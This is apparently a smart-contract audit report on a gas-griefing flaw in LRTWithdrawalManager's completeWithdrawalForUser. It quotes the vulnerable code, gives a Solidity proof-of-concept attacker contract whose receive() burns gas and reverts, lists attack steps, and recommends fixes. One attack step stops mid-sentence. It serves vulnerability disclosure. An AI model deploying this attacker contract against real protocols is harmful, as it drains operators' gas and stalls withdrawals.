### Title
Operator Gas Griefing via Malicious ETH Recipient in `completeWithdrawalForUser` — (File: contracts/LRTWithdrawalManager.sol)

---

### Summary

`LRTWithdrawalManager.completeWithdrawalForUser()` is an operator-callable function that pushes ETH to an arbitrary user address via a low-level `call`. A malicious depositor can register a withdrawal from a contract whose `receive()` function burns all forwarded gas, causing every operator attempt to complete that withdrawal to revert. Because the entire transaction reverts, the withdrawal request is never removed from the queue, making the gas drain a persistent, recurring attack against the operator.

---

### Finding Description

`completeWithdrawalForUser` delegates to `_processWithdrawalCompletion`, which performs all state mutations (queue pop, storage delete, counter decrement) **before** the final asset transfer:

```solidity
// contracts/LRTWithdrawalManager.sol  _processWithdrawalCompletion
uint256 usersFirstWithdrawalRequestNonce = userAssociatedNonces[asset][user].popFront();
...
delete withdrawalRequests[requestId];
...
unlockedWithdrawalsCount[asset]--;
...
_transferAsset(asset, user, request.expectedAssetAmount);   // ← external call to user
``` [1](#0-0) 

`_transferAsset` for ETH uses an uncapped low-level call:

```solidity
(bool sent,) = payable(to).call{ value: amount }("");
if (!sent) revert EthTransferFailed();
``` [2](#0-1) 

Per EIP-150, the callee receives 63/64 of remaining gas. A malicious `receive()` that spins in a tight loop until `gasleft() < threshold` then reverts will exhaust that budget. The outer `call` returns `(false, "")`, `EthTransferFailed` is thrown, and the **entire transaction reverts** — undoing every state mutation above. The withdrawal request is fully restored in the queue, ready to grief the operator again on the next attempt.

The operator-facing function carries an inline acknowledgement but no on-chain guard:

```solidity
/// @dev Not expected to be used for ETH; potential gas grief scenarios are non-impactful for ETH
function completeWithdrawalForUser(address asset, address user, string calldata referralId)
    external nonReentrant whenNotPaused onlyLRTOperator
``` [3](#0-2) 

Nothing prevents the operator from calling this for ETH, and nothing prevents a user from registering an ETH withdrawal from a malicious contract.

---

### Impact Explanation

Every operator call to `completeWithdrawalForUser` for the poisoned address burns a full transaction's worth of gas with zero progress. Because the request is never consumed, the operator can be forced to repeat this indefinitely. With multiple malicious withdrawal requests queued (each from a different malicious contract), the cumulative gas drain can be significant. This maps to **Medium — Unbounded gas consumption** in the allowed impact scope.

---

### Likelihood Explanation

The attack requires only:
1. Deploying a contract whose `receive()` loops until gas is exhausted then reverts (trivial, zero cost beyond deployment).
2. Calling `initiateWithdrawal(ETH_TOKEN, amount)` from that contract (requires holding rsETH, a low barrier).
3. Waiting for the withdrawal delay, after which the operator's normal workflow of calling `completeWithdrawalForUser` triggers the grief.

The operator has no on-chain way to distinguish a benign stuck withdrawal (e.g., a multisig that cannot self-call `completeWithdrawal`) from a malicious one before spending gas. The comment "Not expected to be used for ETH" is documentation, not enforcement.

---

### Recommendation

1. **Pull pattern**: Do not push ETH to `user` inside `completeWithdrawalForUser`. Instead, record the claimable amount in a mapping and let the user pull it with a separate `claimETH()` call. This removes the operator's exposure to the user's `receive()` logic entirely.
2. **Gas cap on the forwarded call**: Forward a fixed, bounded gas stipend (e.g., `call{gas: 30_000, value: amount}`) and treat a failed transfer as a claimable balance rather than a revert.
3. **On-chain guard**: Add `if (asset == LRTConstants.ETH_TOKEN) revert NotSupportedForETH()` inside `completeWithdrawalForUser` to enforce the documented intent.

---

### Proof of Concept

```solidity
// Attacker contract
contract MaliciousReceiver {
    ILRTWithdrawalManager wm;
    IRSETH rsETH;

    constructor(address _wm, address _rsETH) {
        wm = ILRTWithdrawalManager(_wm);
        rsETH = IRSETH(_rsETH);
    }

    function attack(uint256 rsETHAmount) external {
        // 1. Acquire rsETH (e.g., buy on market), approve, and queue withdrawal
        rsETH.approve(address(wm), rsETHAmount);
        wm.initiateWithdrawal(ETH_TOKEN, rsETHAmount, "");
    }

    // 2. When operator calls completeWithdrawalForUser(ETH, address(this), ...)
    //    this receive() drains 63/64 of forwarded gas then reverts.
    receive() external payable {
        uint256 threshold = 5_000;
        while (gasleft() > threshold) { /* spin */ }
        revert("gas drained");
    }
}
```

**Attack flow**:
1. Deploy `MaliciousReceiver`, call `attack()` to queue an ETH withdrawal.
2. After `withdrawalDelayBlocks`, the operator's bot detects the unlocked request and calls `completeWithdrawalForUser(ETH_TOKEN, address(malicious), "")`.
3. `_transferAsset` forwards gas → `receive()` exhausts it → transaction reverts.
4. Withdrawal request is fully restored in `userAssociatedNonces` and `withdrawal

### Citations

**File:** contracts/LRTWithdrawalManager.sol (L191-204)
```text
    /// @dev Not expected to be used for ETH; potential gas grief scenarios are non-impactful for ETH
    function completeWithdrawalForUser(
        address asset,
        address user,
        string calldata referralId
    )
        external
        nonReentrant
        whenNotPaused
        onlyLRTOperator
    {
        _processWithdrawalCompletion(asset, user, referralId);
        emit AssetWithdrawalCompletedBy(msg.sender);
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L699-738)
```text
    function _processWithdrawalCompletion(address asset, address user, string calldata referralId) internal {
        if (userAssociatedNonces[asset][user].empty()) {
            revert NoWithdrawalRequests(user, asset);
        }

        // Retrieve and remove the oldest withdrawal request for the user.
        uint256 usersFirstWithdrawalRequestNonce = userAssociatedNonces[asset][user].popFront();
        // Ensure the request is already unlocked.
        if (usersFirstWithdrawalRequestNonce >= nextLockedNonce[asset]) revert WithdrawalLocked();

        bytes32 requestId = getRequestId(asset, usersFirstWithdrawalRequestNonce);
        WithdrawalRequest memory request = withdrawalRequests[requestId];

        delete withdrawalRequests[requestId];

        // Check that the withdrawal delay has passed since the request's initiation.
        if (block.number < request.withdrawalStartBlock + withdrawalDelayBlocks) revert WithdrawalDelayNotPassed();

        unlockedWithdrawalsCount[asset]--;

        // If Aave integration is enabled and asset is ETH, withdraw from Aave if needed
        if (isAaveIntegrationEnabled && asset == LRTConstants.ETH_TOKEN) {
            uint256 contractBalance = address(this).balance;
            if (contractBalance < request.expectedAssetAmount) {
                uint256 amountNeeded = request.expectedAssetAmount - contractBalance;
                _withdrawFromAave(amountNeeded);

                // Verify we have sufficient balance after withdrawal
                uint256 balanceAfter = address(this).balance;
                if (balanceAfter < request.expectedAssetAmount) {
                    revert InsufficientLiquidityForWithdrawal();
                }
            }
        }

        _transferAsset(asset, user, request.expectedAssetAmount);

        emit ReferralIdEmitted(referralId);
        emit AssetWithdrawalFinalized(user, asset, request.rsETHUnstaked, request.expectedAssetAmount);
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L876-883)
```text
    function _transferAsset(address asset, address to, uint256 amount) internal {
        if (asset == LRTConstants.ETH_TOKEN) {
            (bool sent,) = payable(to).call{ value: amount }("");
            if (!sent) revert EthTransferFailed();
        } else {
            IERC20(asset).safeTransfer(to, amount);
        }
    }
```
